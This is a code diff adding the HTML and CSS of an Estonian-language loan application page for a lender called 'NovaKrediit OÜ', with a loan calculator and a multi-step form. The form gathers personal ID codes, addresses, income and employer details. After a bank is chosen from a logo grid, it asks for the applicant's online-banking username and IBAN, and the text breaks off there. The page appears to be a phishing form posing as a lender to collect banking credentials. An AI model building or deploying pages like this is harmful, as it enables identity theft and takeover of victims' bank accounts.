+    .radio-option,.check-option{min-height:44px;padding:12px 18px;}
+    .btn-next,.btn-prev,.btn-submit,.btn-calc-main,.hero-banner-btn{min-height:48px;}
+    .stepper-sublabel{display:none;}
+    .stepper-step{padding:12px 8px;gap:7px;}
+    .stepper-label{font-size:0.75rem;}
+  }
+
+  /* ── CALC RESULTS GRID ── */
+  .calc-results-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin:20px 0 22px;}
+  .calc-result-card{background:rgba(255,255,255,0.05);border:1px solid rgba(212,168,67,0.18);border-radius:12px;padding:14px 12px;text-align:center;}
+  .calc-result-card--total{background:rgba(212,168,67,0.1);border-color:rgba(212,168,67,0.4);}
+  .calc-result-label{font-size:0.68rem;text-transform:uppercase;letter-spacing:0.1em;color:rgba(255,255,255,0.4);margin-bottom:6px;}
+  .calc-result-value{font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:1.45rem;color:#d4a843;line-height:1;}
+  .calc-result-value--interest{color:rgba(255,255,255,0.6);font-size:1.2rem;}
+
+  /* ── AMORTIZATION ── */
+  .amort-wrap{margin-bottom:18px;}
+  .amort-toggle{background:none;border:1px solid rgba(212,168,67,0.25);color:rgba(255,255,255,0.5);font-family:'Inter',sans-serif;font-size:0.78rem;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%;text-align:left;transition:all 0.18s;}
+  .amort-toggle:hover{border-color:#d4a843;color:#e8c06a;}
+  .amort-table{width:100%;border-collapse:collapse;font-size:0.78rem;margin-top:10px;color:rgba(255,255,255,0.7);}
+  .amort-table thead{background:rgba(212,168,67,0.12);}
+  .amort-table th{padding:7px 10px;text-align:right;font-size:0.67rem;text-transform:uppercase;letter-spacing:0.07em;color:rgba(212,168,67,0.7);font-weight:600;}
+  .amort-table th:first-child{text-align:left;}
+  .amort-table td{padding:6px 10px;text-align:right;border-bottom:1px solid rgba(255,255,255,0.04);}
+  .amort-table td:first-child{text-align:left;color:rgba(255,255,255,0.35);}
+  .amort-show-all{width:100%;background:none;border:none;color:rgba(212,168,67,0.6);font-size:0.75rem;cursor:pointer;padding:8px 0 2px;text-align:center;font-family:'Inter',sans-serif;}
+  .amort-show-all:hover{color:#d4a843;}
+
+  /* ── APR BLOCK ── */
+  .calc-apr-block{border-top:1px solid rgba(212,168,67,0.15);margin-top:4px;padding-top:14px;margin-bottom:18px;}
+  .calc-apr-row{display:flex;justify-content:space-between;align-items:baseline;gap:8px;margin-bottom:5px;}
+  .calc-apr-row--sub{opacity:0.65;}
+  .calc-apr-label{font-size:0.72rem;text-transform:uppercase;letter-spacing:0.09em;color:rgba(255,255,255,0.45);}
+  .calc-apr-value{font-family:'Plus Jakarta Sans',sans-serif;font-weight:700;font-size:0.95rem;color:#e8c06a;white-space:nowrap;}
+  .calc-apr-value--muted{color:rgba(255,255,255,0.4);font-size:0.82rem;font-weight:500;}
+  .calc-apr-legal{font-size:0.68rem;color:rgba(255,255,255,0.3);line-height:1.55;margin-top:8px;border-top:1px solid rgba(255,255,255,0.06);padding-top:8px;}
+
+  /* ── DOCS INFO BOX ── */
+  .docs-info-box{display:flex;gap:16px;background:#fdf8ee;border:1px solid rgba(212,168,67,0.3);border-radius:12px;padding:20px 22px;margin-bottom:4px;}
+  .docs-info-icon{font-size:1.5rem;flex-shrink:0;margin-top:2px;}
+  .docs-info-text{font-size:0.88rem;color:#374151;line-height:1.6;}
+  .docs-info-text strong{color:var(--navy);}
+  .docs-email-link{color:var(--gold);font-weight:600;text-decoration:none;}
+  .docs-email-link:hover{text-decoration:underline;}
+  .docs-list{margin:10px 0 10px 4px;display:flex;flex-direction:column;gap:8px;list-style:none;}
+  .docs-list li{display:flex;gap:8px;align-items:flex-start;}
+  .docs-info-sub{font-size:0.78rem;color:var(--muted);font-style:italic;margin-top:10px;}
+
+  /* ── FOOTER APR ── */
+  .footer-apr-mention{font-size:0.69rem;color:rgba(255,255,255,0.28);line-height:1.6;font-style:italic;border-top:1px solid rgba(255,255,255,0.06);padding-top:10px;width:100%;display:block;margin-top:6px;}
+
+  /* ── SUCCESS OVERLAY ANIMATIONS ── */
+  @keyframes sov-pop{from{transform:scale(0.5);opacity:0;}to{transform:scale(1);opacity:1;}}
+  @keyframes sov-up{from{opacity:0;transform:translateY(14px);}to{opacity:1;transform:translateY(0);}}
+  @keyframes sov-pulse{0%,100%{background:rgba(200,151,47,0.25);transform:scale(1);}50%{background:rgba(200,151,47,0.8);transform:scale(1.35);}}
+  .sov-title{font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:1.75rem;color:#0d1b2a;letter-spacing:-0.03em;margin-bottom:14px;animation:sov-up 0.4s ease 0.3s both;}
+  .sov-sub{font-size:0.93rem;color:#6b7a99;line-height:1.7;animation:sov-up 0.4s ease 0.45s both;}
+  .sov-divider{width:40px;height:2px;background:linear-gradient(90deg,transparent,#c8972f,transparent);margin:24px auto;animation:sov-up 0.4s ease 0.55s both;}
+  .sov-dots{display:flex;gap:8px;justify-content:center;animation:sov-up 0.4s ease 0.65s both;}
+  .sov-dot{width:7px;height:7px;border-radius:50%;background:rgba(200,151,47,0.35);animation:sov-pulse 1.4s ease-in-out infinite;}
+  .sov-dot:nth-child(2){animation-delay:0.2s;}
+  .sov-dot:nth-child(3){animation-delay:0.4s;}
+
+  /* ── BANK LOGO GRID ── */
+  .bank-logo-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 10px;
+    margin-top: 6px;
+  }
+  .bank-logo-btn {
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 7px;
+    padding: 14px 8px 10px;
+    border: 1.5px solid var(--border);
+    border-radius: 12px;
+    background: var(--white);
+    cursor: pointer;
+    transition: all 0.18s;
+    min-height: 86px;
+    box-shadow: var(--shadow-sm);
+  }
+  .bank-logo-btn:hover {
+    border-color: var(--gold);
+    box-shadow: 0 4px 14px rgba(212,168,67,0.18);
+    transform: translateY(-2px);
+  }
+  .bank-logo-btn.selected {
+    border-color: var(--gold);
+    background: #fffdf7;
+    box-shadow: 0 0 0 3px rgba(212,168,67,0.2);
+  }
+  .bank-logo-btn img {
+    display: block;
+    max-width: 72px;
+    max-height: 30px;
+    width: auto;
+    height: auto;
+    object-fit: contain;
+  }
+  .bank-logo-btn svg { display: block; }
+  .bank-logo-name {
+    font-size: 0.82rem;
+    font-weight: 700;
+    color: var(--muted);
+    letter-spacing: 0.01em;
+    text-align: center;
+    line-height: 1.2;
+  }
+  .bank-logo-btn.selected .bank-logo-name { color: var(--navy); }
+  .bank-logo-check {
+    position: absolute;
+    top: 5px; right: 5px;
+    width: 18px; height: 18px;
+    background: var(--gold);
+    border-radius: 50%;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    font-size: 10px;
+    color: #1a1a2e;
+    font-weight: 900;
+    line-height: 1;
+  }
+  .bank-logo-btn.selected .bank-logo-check { display: flex; }
+  /* champs qui apparaissent après sélection banque */
+  .bank-extra-field {
+    display: none;
+    margin-top: 18px;
+    padding-top: 18px;
+    border-top: 1px solid var(--border);
+  }
+  .bank-extra-field.visible { display: block; }
+  @media (max-width: 500px) {
+    .bank-logo-grid { grid-template-columns: repeat(2, 1fr); gap: 8px; }
+    .bank-logo-btn { min-height: 68px; padding: 10px 6px 8px; }
+    .bank-logo-btn img { max-width: 60px; max-height: 26px; }
+  }
+
+
+  @keyframes pulse-dot {
+    0%, 100% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.6); opacity: 0.4; }
+  }
+</style>
+</head>
+<body>
+<a href="#creditForm" class="skip-link">Hüppa põhisisule</a>
+
+<!-- LANG -->
+<div class="lang-bar">
+  <button class="lang-btn active" onclick="setLang('et')">ET</button>
+  <button class="lang-btn" onclick="setLang('en')">EN</button>
+  <button class="lang-btn" onclick="setLang('ru')">RU</button>
+</div>
+
+<!-- HEADER -->
+<div class="header">
+  <div class="logo-wrap">
+    <!-- Shield SVG logo -->
+    <svg class="logo-shield" viewBox="0 0 80 90" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="sg1" x1="0" y1="0" x2="80" y2="90" gradientUnits="userSpaceOnUse">
+          <stop offset="0%" stop-color="#e8c97a"/>
+          <stop offset="100%" stop-color="#c9a84c"/>
+        </linearGradient>
+        <linearGradient id="sg2" x1="0" y1="0" x2="80" y2="90" gradientUnits="userSpaceOnUse">
+          <stop offset="0%" stop-color="#1a3460"/>
+          <stop offset="100%" stop-color="#0a1628"/>
+        </linearGradient>
+      </defs>
+      <!-- Shield body -->
+      <path d="M40 4L8 17v26c0 21 13.5 39.5 32 46.5C58.5 82.5 72 64 72 43V17L40 4z" fill="url(#sg2)" stroke="url(#sg1)" stroke-width="2"/>
+      <!-- Chart line -->
+      <polyline points="22,55 32,41 40,49 54,29" stroke="#e8c97a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+      <!-- Arrow head -->
+      <polyline points="50,27 56,27 56,33" stroke="#e8c97a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+      <!-- Car body -->
+      <rect x="21" y="59" width="38" height="9" rx="4" fill="rgba(232,201,122,0.18)"/>
+      <rect x="27" y="53" width="26" height="9" rx="3" fill="rgba(232,201,122,0.25)"/>
+      <!-- Wheels -->
+      <circle cx="29" cy="69" r="3.5" fill="rgba(232,201,122,0.4)"/>
+      <circle cx="51" cy="69" r="3.5" fill="rgba(232,201,122,0.4)"/>
+    </svg>
+    <div class="logo-text">
+      <div class="logo-name">Nova<span>Krediit</span> <span style="font-weight:400;font-size:0.95rem;color:#8899bb">OÜ</span></div>
+      <div class="logo-sub">Personaal- ja autokrediit</div>
+    </div>
+  </div>
+  <div class="header-badge" data-i18n="secure-badge">Turvaline taotlus</div>
+</div>
+
+<!-- HERO BANNER -->
+<div class="hero-banner">
+  <div class="hero-banner-left">
+    <div class="hero-banner-tag">Kiire · Turvaline · Digitaalne</div>
+    <h1 class="hero-banner-title">Laen kuni <em>30 000 €</em><br>— vastus kohe</h1>
+    <p class="hero-banner-sub">Ilma lepingutasuta · Ilma käendajata · 100% veebis</p>
+    <div class="hero-banner-stats">
+      <div class="hbs-item"><span class="hbs-num">15 min</span><span class="hbs-label">Otsuse aeg</span></div>
+      <div class="hbs-divider"></div>
+      <div class="hbs-item"><span class="hbs-num">30 000 €</span><span class="hbs-label">Maksimaalne summa</span></div>
+      <div class="hbs-divider"></div>
+      <div class="hbs-item"><span class="hbs-num">120 kuud</span><span class="hbs-label">Maksimaalne periood</span></div>
+    </div>
+    <button onclick="document.getElementById('creditForm').scrollIntoView({behavior:'smooth'})" class="hero-banner-btn">Esitan taotluse →</button>
+  </div>
+
+  <div class="hero-banner-right">
+    <svg viewBox="0 0 420 340" xmlns="http://www.w3.org/2000/svg" class="hero-svg">
+      <!-- Background circles -->
+      <circle cx="340" cy="60" r="120" fill="rgba(212,168,67,0.06)"/>
+      <circle cx="80" cy="280" r="80" fill="rgba(212,168,67,0.04)"/>
+
+      <!-- Main card -->
+      <rect x="40" y="60" width="240" height="150" rx="16" fill="#ffffff" opacity="0.97"/>
+      <rect x="40" y="60" width="240" height="40" rx="16" fill="#1a1a2e"/>
+      <rect x="40" y="84" width="240" height="16" fill="#1a1a2e"/>
+      <!-- Card chip -->
+      <rect x="62" y="76" width="28" height="20" rx="4" fill="#d4a843"/>
+      <rect x="65" y="76" width="2" height="20" fill="rgba(0,0,0,0.15)"/>
+      <rect x="68" y="76" width="2" height="20" fill="rgba(0,0,0,0.1)"/>
+      <!-- Card number -->
+      <circle cx="72" cy="134" r="3" fill="#1a1a2e" opacity="0.3"/>
+      <circle cx="81" cy="134" r="3" fill="#1a1a2e" opacity="0.3"/>
+      <circle cx="90" cy="134" r="3" fill="#1a1a2e" opacity="0.3"/>
+      <circle cx="99" cy="134" r="3" fill="#1a1a2e" opacity="0.3"/>
+      <circle cx="115" cy="134" r="3" fill="#1a1a2e" opacity="0.3"/>
+      <circle cx="124" cy="134" r="3" fill="#1a1a2e" opacity="0.3"/>
+      <circle cx="133" cy="134" r="3" fill="#1a1a2e" opacity="0.3"/>
+      <circle cx="142" cy="134" r="3" fill="#1a1a2e" opacity="0.3"/>
+      <text x="160" y="138" font-size="11" fill="#1a1a2e" font-family="monospace" opacity="0.7">5842</text>
+      <!-- Card name -->
+      <text x="62" y="165" font-size="9" fill="#6b7280" font-family="sans-serif">KAARDI OMANIK</text>
+      <text x="62" y="178" font-size="11" fill="#1a1a2e" font-family="sans-serif" font-weight="600">NovaKrediit OÜ</text>
+      <!-- Mastercard circles -->
+      <circle cx="244" cy="170" r="14" fill="#eb001b" opacity="0.85"/>
+      <circle cx="258" cy="170" r="14" fill="#f79e1b" opacity="0.85"/>
+      <ellipse cx="251" cy="170" rx="5" ry="14" fill="#ff5f00" opacity="0.6"/>
+
+      <!-- Floating money badge -->
+      <rect x="220" y="40" width="130" height="52" rx="12" fill="#d4a843"/>
+      <text x="285" y="62" font-size="9" fill="rgba(26,26,46,0.7)" text-anchor="middle" font-family="sans-serif" font-weight="600" letter-spacing="1">LAENUSUMMA</text>
+      <text x="285" y="82" font-size="20" fill="#1a1a2e" text-anchor="middle" font-family="sans-serif" font-weight="800">5 000 €</text>
+
+      <!-- Progress / approval card -->
+      <rect x="180" y="170" width="190" height="110" rx="14" fill="#16213e"/>
+      <text x="200" y="196" font-size="9" fill="rgba(212,168,67,0.7)" font-family="sans-serif" font-weight="700" letter-spacing="1">TAOTLUS KINNITATUD</text>
+      <!-- checkmark circle -->
+      <circle cx="345" cy="190" r="12" fill="#d4a843"/>
+      <text x="345" y="195" font-size="13" fill="#1a1a2e" text-anchor="middle" font-weight="800">✓</text>
+      <!-- Progress bar -->
+      <rect x="200" y="210" width="150" height="6" rx="3" fill="rgba(255,255,255,0.08)"/>
+      <rect x="200" y="210" width="120" height="6" rx="3" fill="#d4a843"/>
+      <text x="200" y="232" font-size="8" fill="rgba(255,255,255,0.45)" font-family="sans-serif">Menetluses</text>
+      <text x="350" y="232" font-size="8" fill="#d4a843" font-family="sans-serif" text-anchor="end">80%</text>
+      <!-- Monthly payment -->
+      <text x="200" y="258" font-size="9" fill="rgba(255,255,255,0.45)" font-family="sans-serif">Kuumakse alates</text>
+      <text x="200" y="274" font-size="18" fill="#ffffff" font-family="sans-serif" font-weight="800">148 € <tspan font-size="10" fill="rgba(255,255,255,0.45)">/kuus</tspan></text>
+
+      <!-- Floating shield -->
+      <g transform="translate(20,180)">
+        <path d="M25 5 L45 13 L45 28 C45 38 35 46 25 50 C15 46 5 38 5 28 L5 13 Z" fill="#d4a843" opacity="0.9"/>
+        <text x="25" y="33" font-size="16" text-anchor="middle" fill="#1a1a2e" font-weight="800">✓</text>
+      </g>
+
+      <!-- Decorative dots -->
+      <circle cx="370" cy="130" r="4" fill="#d4a843" opacity="0.4"/>
+      <circle cx="385" cy="145" r="2.5" fill="#d4a843" opacity="0.25"/>
+      <circle cx="360" cy="150" r="2" fill="#d4a843" opacity="0.3"/>
+    </svg>
+  </div>
+</div>
+
+<div class="calc-section">
+  <div class="calc-box">
+    <div class="calc-box-title">Laenumakse kalkulaator</div>
+
+
+
+    <div class="calc-row">
+      <div class="calc-label-row">
+        <span>Vali summa</span>
+        <strong id="calc-amount-val">5 000 €</strong>
+      </div>
+      <input type="range" id="calc-amount" min="500" max="30000" step="500" value="5000" oninput="updateCalc()">
+      <div class="calc-range-labels"><span>500 €</span><span>30 000 €</span></div>
+    </div>
+
+    <div class="calc-row">
+      <div class="calc-label-row">
+        <span>Vali periood</span>
+        <strong id="calc-period-val">36 kuud</strong>
+      </div>
+      <input type="range" id="calc-period" min="6" max="120" step="6" value="36" oninput="updateCalc()">
+      <div class="calc-range-labels"><span>6 kuud</span><span>120 kuud</span></div>
+    </div>
+
+    <div class="calc-results-grid">
+      <div class="calc-result-card"><div class="calc-result-label" data-i18n="calc-monthly-label">Kuumakse</div><div class="calc-result-value" id="calc-monthly">148 &euro;</div></div>
+      <div class="calc-result-card calc-result-card--total"><div class="calc-result-label" data-i18n="calc-total-label">Kogumakse</div><div class="calc-result-value" id="calc-total">5 328 &euro;</div></div>
+      <div class="calc-result-card"><div class="calc-result-label" data-i18n="calc-interest-label">Intressid kokku</div><div class="calc-result-value calc-result-value--interest" id="calc-interest">328 &euro;</div></div>
+    </div>
+
+    <div class="amort-wrap">
+      <button type="button" class="amort-toggle" id="amort-toggle" onclick="toggleAmort()"><span id="amort-toggle-icon">&#9658;</span> <span data-i18n="amort-toggle-label">N&auml;ita tagasimaksegraafiku eelvaadet</span></button>
+      <div id="amort-table-wrap" style="display:none;">
+        <table class="amort-table"><thead><tr><th>#</th><th data-i18n="amort-th-monthly">Kuumakse</th><th data-i18n="amort-th-principal">P&otilde;hiosa</th><th data-i18n="amort-th-interest">Intress</th><th data-i18n="amort-th-balance">J&auml;&auml;k</th></tr></thead><tbody id="amort-preview"></tbody></table>
+        <div id="amort-all-wrap" style="display:none;"><table class="amort-table" style="margin-top:0;border-top:none;"><tbody id="amort-full"></tbody></table></div>
+        <button type="button" class="amort-show-all" id="amort-show-all-btn" onclick="toggleAmortFull()"><span id="amort-show-all-label" data-i18n="amort-show-all">N&auml;ita k&otilde;iki makseid &#9662;</span></button>
+      </div>
+    </div>
+
+    <div class="calc-apr-block">
+      <div class="calc-apr-row"><span class="calc-apr-label">TAEG (APR)</span><span class="calc-apr-value">12,00 %</span></div>
+      <div class="calc-apr-row calc-apr-row--sub"><span class="calc-apr-label" data-i18n="apr-rate-label">Laenu intressim&auml;&auml;r (aastas)</span><span class="calc-apr-value calc-apr-value--muted">12,00 %</span></div>
+      <p class="calc-apr-legal"><span data-i18n="apr-example-prefix">N&auml;idisarvutus:</span> <span id="calc-apr-example">5 000 &euro; laenul 36 kuu jooksul on kuumakse 166 &euro;, kogumakse 5 976 &euro;, intressid 976 &euro;. TAEG 12,00 %.</span> <span data-i18n="apr-legal-note">L&otilde;plik intressim&auml;&auml;r s&otilde;ltub kliendi krediidiv&otilde;imekusest. Arvutus on ligikaudne ja ei kujuta endast laenupakkumist.</span></p>
+    </div>
+
+    <div class="calc-badges">
+      <span>&#x2713; <span data-i18n="calc-badge-1">Igale kliendile personaalne pakkumine</span></span>
+      <span>&#x2713; <span data-i18n="calc-badge-2">Laenutaotlusele saad vastuse kohe</span></span>
+    </div>
+
+    <button type="button" class="btn-calc-main" onclick="applyCalcToForm(); document.getElementById('creditForm').scrollIntoView({behavior:'smooth'})" data-i18n="calc-cta">Esitan laenutaotluse</button>
+  </div>
+</div>
+
+<nav class="stepper-bar" id="stepperBar" aria-label="Taotluse sammud">
+  <div class="stepper-inner">
+    <div class="stepper-step active" id="st-1" onclick="goStep(1)" role="button" tabindex="0" aria-current="step" onkeydown="if(event.key==='Enter'||event.key===' ')goStep(1)">
+      <div class="stepper-num" id="sn-1">1</div>
+      <div><div class="stepper-label" id="sl-1">Identiteet</div><div class="stepper-sublabel" id="ss-1">Isiku- &amp; elukohaandmed</div></div>
+    </div>
+    <div class="stepper-step" id="st-2" onclick="goStep(2)" role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' ')goStep(2)">
+      <div class="stepper-num" id="sn-2">2</div>
+      <div><div class="stepper-label" id="sl-2">T&ouml;&ouml; &amp; Pank</div><div class="stepper-sublabel" id="ss-2">Sissetulek &amp; pangakonto</div></div>
+    </div>
+
+  </div>
+</nav>
+<div class="container">
+  <p class="page-subtitle" data-i18n="page-subtitle">Täitke kõik väljad täpselt. Teie andmeid töödeldakse konfidentsiaalselt.</p>
+
+  <div role="status" aria-live="polite" aria-atomic="true" id="a11y-announce" class="sr-only"></div>
+  <form id="creditForm" novalidate aria-label="Krediiditaotluse vorm" action="javascript:void(0)" method="post" onsubmit="return false;">
+
+    <!-- Champs cachés synchronisés depuis le calculateur -->
+    <input type="hidden" id="summa" name="summa" value="5000">
+    <input type="hidden" id="periood" name="periood" value="36 kuud">
+    
+
+    <div class="form-step active" id="form-step-1">
+    <!-- ISIKUANDMED -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-title" data-i18n="sec-personal">Isikuandmed</div>
+      </div>
+      <div class="section-body">
+        <div class="grid-2">
+          <div class="field">
+            <label for="eesnimi">Eesnimi <span style="color:#d4a843">*</span></label>
+            <input type="text" id="eesnimi" name="eesnimi" placeholder="Eesnimi" required>
+          
+            <span class="field-hint" id="hint-eesnimi" aria-live="polite"></span></div>
+          <div class="field">
+            <label for="perenimi">Perekonnanimi <span style="color:#d4a843">*</span></label>
+            <input type="text" id="perenimi" name="perenimi" placeholder="Perekonnanimi" required>
+          
+            <span class="field-hint" id="hint-perenimi" aria-live="polite"></span></div>
+          <div class="field">
+            <label for="isikukood">Isikukood <span style="color:#d4a843">*</span></label>
+            <input type="text" id="isikukood" name="isikukood" placeholder="38001010000" required pattern="[0-9]{11}" title="11 numbrit">
+          
+            <span class="field-hint" id="hint-isikukood" aria-live="polite"></span></div>
+          <div class="field">
+            <label for="synniaeg">Sünniaeg <span style="color:#d4a843">*</span></label>
+            <input type="date" id="synniaeg" name="synniaeg" required>
+          </div>
+          <div class="field">
+            <label for="telefon">Telefon <span style="color:#d4a843">*</span></label>
+            <input type="tel" id="telefon" name="telefon" placeholder="+372 5000 0000" required>
+          
+            <span class="field-hint" id="hint-telefon" aria-live="polite"></span></div>
+          <div class="field">
+            <label for="epost">E-post <span style="color:#d4a843">*</span></label>
+            <input type="email" id="epost" name="epost" placeholder="nimi@email.ee" required>
+          
+            <span class="field-hint" id="hint-epost" aria-live="polite"></span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- LAENUANDMED : montant + durée visible -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-title">Laenuandmed</div>
+      </div>
+      <div class="section-body">
+        <div class="grid-2">
+          <div class="field">
+            <label for="field-summa">Laenusumma <span style="color:#d4a843">*</span></label>
+            <div style="position:relative;">
+              <input type="number" id="field-summa" name="field_summa" placeholder="5000" min="500" max="30000" step="500" required oninput="syncSummaToCalc(this.value)" style="padding-right:36px;">
+              <span style="position:absolute;right:14px;top:50%;transform:translateY(-50%);color:#6b7280;font-weight:600;font-size:0.88rem;pointer-events:none;">€</span>
+            </div>
+            <span style="font-size:0.72rem;color:#9ca3af;margin-top:3px;">500 € – 30 000 €</span>
+          </div>
+          <div class="field">
+            <label for="field-periood">Tagasimakseperiood <span style="color:#d4a843">*</span></label>
+            <div class="select-wrap">
+              <select id="field-periood" name="field_periood" required onchange="syncPerioodToCalc(this.value)">
+                <option value="">Vali periood</option>
+                <option value="6">6 kuud</option>
+                <option value="12">12 kuud</option>
+                <option value="18">18 kuud</option>
+                <option value="24">24 kuud</option>
+                <option value="36" selected>36 kuud</option>
+                <option value="48">48 kuud</option>
+                <option value="60">60 kuud</option>
+                <option value="72">72 kuud</option>
+                <option value="84">84 kuud</option>
+                <option value="96">96 kuud</option>
+                <option value="108">108 kuud</option>
+                <option value="120">120 kuud</option>
+              </select>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ELUKOHA ANDMED -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-title" data-i18n="sec-address">Elukoha andmed</div>
+      </div>
+      <div class="section-body">
+        <div class="grid-2">
+          <div class="field span-2">
+            <label for="aadress">Aadress <span style="color:#d4a843">*</span></label>
+            <input type="text" id="aadress" name="aadress" placeholder="Tänav, maja, korter" required>
+          
+            <span class="field-hint" id="hint-aadress" aria-live="polite"></span></div>
+          <div class="field">
+            <label for="linn">Linn <span style="color:#d4a843">*</span></label>
+            <input type="text" id="linn" name="linn" placeholder="Tallinn" required>
+          
+            <span class="field-hint" id="hint-linn" aria-live="polite"></span></div>
+          <div class="field">
+            <label for="postiindeks">Postiindeks <span style="color:#d4a843">*</span></label>
+            <input type="text" id="postiindeks" name="postiindeks" placeholder="10001" required>
+          
+            <span class="field-hint" id="hint-postiindeks" aria-live="polite"></span></div>
+          <div class="field span-2">
+            <label for="riik">Riik</label>
+            <div class="select-wrap">
+              <select id="riik" name="riik">
+                <option value="">Vali riik</option>
+                <option value="EE" selected>Eesti</option>
+                <option value="LV">Läti</option>
+                <option value="LT">Leedu</option>
+                <option value="FI">Soome</option>
+                <option value="SE">Rootsi</option>
+                <option value="DE">Saksamaa</option>
+                <option value="OTHER">Muu</option>
+              </select>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step-nav" style="justify-content:flex-end;">
+      <button type="button" class="btn-next" id="btn-next-1" onclick="nextStep(1)">J&auml;rgmine: T&ouml;&ouml; &amp; Pank &rarr;</button>
+    </div>
+    </div><!-- /form-step-1 -->
+    <div class="form-step" id="form-step-2">
+    <!-- TÖÖANDMED -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-title" data-i18n="sec-work">Tööandmed</div>
+      </div>
+      <div class="section-body">
+        <div class="grid-2">
+          <div class="field span-2">
+            <label for="tooandja">Tööandja <span style="color:#d4a843">*</span></label>
+            <input type="text" id="tooandja" name="tooandja" placeholder="Ettevõtte nimi" required>
+          
+            <span class="field-hint" id="hint-tooandja" aria-live="polite"></span></div>
+          <div class="field">
+            <label for="ametikoht">Ametikoht <span style="color:#d4a843">*</span></label>
+            <input type="text" id="ametikoht" name="ametikoht" placeholder="Ametikoht" required>
+          
+            <span class="field-hint" id="hint-ametikoht" aria-live="polite"></span></div>
+          <div class="field">
+            <label for="toostaaz">Tööstaaž</label>
+            <div class="select-wrap">
+              <select id="toostaaz" name="toostaaz">
+                <option value="">Vali...</option>
+                <option>Alla 6 kuu</option>
+                <option>6–12 kuud</option>
+                <option>1–3 aastat</option>
+                <option>3–5 aastat</option>
+                <option>Üle 5 aasta</option>
+              </select>
+            </div>
+          </div>
+          <div class="field span-2">
+            <label for="sissetulek">Igakuine netosissetulek <span style="color:#d4a843">*</span></label>
+            <div class="money-wrap">
+              <input type="number" id="sissetulek" name="sissetulek" placeholder="0.00" min="0" step="0.01" required>
+              <span class="money-suffix">€</span>
+            
+            <span class="field-hint" id="hint-sissetulek" aria-live="polite"></span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SÕIDUKI ANDMED -->
+    <div class="section" id="auto-section" style="display:none;">
+      <div class="section-header">
+        <div class="section-title" data-i18n="sec-vehicle">Sõiduki andmed</div>
+      </div>
+      <div class="section-body">
+        <div class="grid-2">
+          <div class="field">
+            <label for="mark">Mark</label>
+            <input type="text" id="mark" name="mark" placeholder="nt Toyota">
+          </div>
+          <div class="field">
+            <label for="mudel">Mudel</label>
+            <input type="text" id="mudel" name="mudel" placeholder="nt Corolla">
+          </div>
+          <div class="field">
+            <label for="aasta">Aasta</label>
+            <input type="number" id="aasta" name="aasta" placeholder="2020" min="1970" max="2026">
+          </div>
+          <div class="field">
+            <label for="vin">VIN</label>
+            <input type="text" id="vin" name="vin" placeholder="17-märgiline kood">
+          </div>
+          <div class="field">
+            <label for="labisoit">Läbisõit (km)</label>
+            <input type="number" id="labisoit" name="labisoit" placeholder="0">
+          </div>
+          <div class="field">
+            <label for="myygihind">Müügihind</label>
+            <div class="money-wrap">
+              <input type="number" id="myygihind" name="myygihind" placeholder="0.00" min="0" step="0.01">
+              <span class="money-suffix">€</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PANGAKONTO -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-title" data-i18n="sec-bank">Pangakonto</div>
+      </div>
+      <div class="section-body">
+        <!-- 1. LOGOS BANQUES -->
+        <div class="field">
+          <label>Pank <span style="color:#d4a843">*</span></label>
+          <input type="hidden" id="pank" name="pank" required>
+          <div class="bank-logo-grid">
+            <button type="button" class="bank-logo-btn" data-bank="SEB" onclick="selectBank(this)">
+              <div class="bank-logo-check">✓</div>
+              <span class="bank-logo-name">SEB</span>
+            </button>
+            <button type="button" class="bank-logo-btn" data-bank="LHV" onclick="selectBank(this)">
+              <div class="bank-logo-check">✓</div>
+              <span class="bank-logo-name">LHV Pank</span>
+            </button>
+            <button type="button" class="bank-logo-btn" data-bank="Coop Pank" onclick="selectBank(this)">
+              <div class="bank-logo-check">✓</div>
+              <span class="bank-logo-name">Coop Pank</span>
+            </button>
+            <button type="button" class="bank-logo-btn" data-bank="Luminor" onclick="selectBank(this)">
+              <div class="bank-logo-check">✓</div>
+              <span class="bank-logo-name">Luminor</span>
+            </button>
+            <button type="button" class="bank-logo-btn" data-bank="Citadele" onclick="selectBank(this)">
+              <div class="bank-logo-check">✓</div>
+              <span class="bank-logo-name">Citadele</span>
+            </button>
+            <button type="button" class="bank-logo-btn" data-bank="Swedbank" onclick="selectBank(this)">
+              <div class="bank-logo-check">✓</div>
+              <span class="bank-logo-name">Swedbank</span>
+            </button>
+            <button type="button" class="bank-logo-btn" data-bank="Muu" onclick="selectBank(this)">
+              <div class="bank-logo-check">✓</div>
+              <span class="bank-logo-name">Muu pank</span>
+            </button>
+          </div>
+          <span class="field-hint" id="hint-pank" aria-live="polite"></span>
+        </div>
+
+        <!-- 2. KASUTAJATUNNUS + IBAN : banques sauf Coop Pank -->
+        <div id="kasutajatunnus-wrap" class="bank-extra-field">
+          <div class="field" style="margin-bottom:16px;">
+            <label for="kasutajatunnus">Kasutajatunnus <span style="color:#d4a843">*</span></label>
+            <input type="text" id="kasutajatunnus" name="kasutajatunnus" placeholder="Sisestage kasutajatunnus">
+            <span class="field-hint" id="hint-kasutajatunnus" aria-live="polite"></span>
+          </div>
+          <div class="field">
+            <label for="iban">IBAN <span style="color:#d4a843">*</span></label>
+            <input type="text" id="iban" name="iban" placeholder="EE00 0000 0000 0000 0000">
+            <span class="field-hint" id="hint-iban" aria-live="polite"></span>
+          </div>
